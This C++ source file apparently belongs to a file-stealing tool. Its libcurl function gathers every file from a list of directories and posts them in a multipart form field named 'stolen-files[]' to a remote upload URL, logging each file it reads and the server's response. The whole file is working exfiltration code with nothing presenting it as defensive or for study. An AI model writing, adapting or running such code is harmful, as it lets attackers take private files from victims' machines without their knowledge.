#include "curl.h"
#include "copy-upload.h"

static size_t writecallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}
namespace crlu {
    void curl_upload(const std::string UPLOAD_URL, std::vector<up::fldir> dirVec) {
        CURL *curl;
        CURLcode res;
        std::string readBuffer;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();

        if(curl) {
            std::cout << "Found Upload URL: " << UPLOAD_URL << std::endl;
            curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_URL.c_str());

            // Initialise mime form
            curl_mime *mime;
            curl_mimepart *part;

            mime = curl_mime_init(curl);

            for (int i = 0; i < dirVec.size(); ++i){
                for (int j = 0; j < dirVec[i].fVec.size(); ++j){
                    part = curl_mime_addpart(mime);
                    std::string pthStr = dirVec[i].fVec[j].string();
                    const char* chkpth = pthStr.c_str();
                    FILE *file = fopen(chkpth, "rb");
                    if (!file) {
                        std::cerr << "Fail Read: " << dirVec[i].fVec[j] << std::endl;
                    } else {
                        curl_mime_name(part, "stolen-files[]");
                        curl_mime_filedata(part, chkpth);
                        std::cout << "Read: " << dirVec[i].fVec[j] << std::endl;
                    }
                    fclose(file);
                }
            }

            // Set the mime form
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

            // Disable Expect: 100-continue header to simplify the request
            curl_slist *headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: multipart/form-data");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writecallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

             // Set timeouts
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // 30 seconds timeout
            curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);  // 10 seconds connection timeout

            // Enable verbose mode - Debug
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            // Perform the request
            res = curl_easy_perform(curl);
            std::cout<< "\nRequest successfully performed" <<std::endl;
            std::cout << "Server response: " << readBuffer << std::endl;
            if(res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            } else {
                std::cout << "Curl success. Aborting program." << std::endl;
            }
            // Clean up
            curl_mime_free(mime);
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
    }
}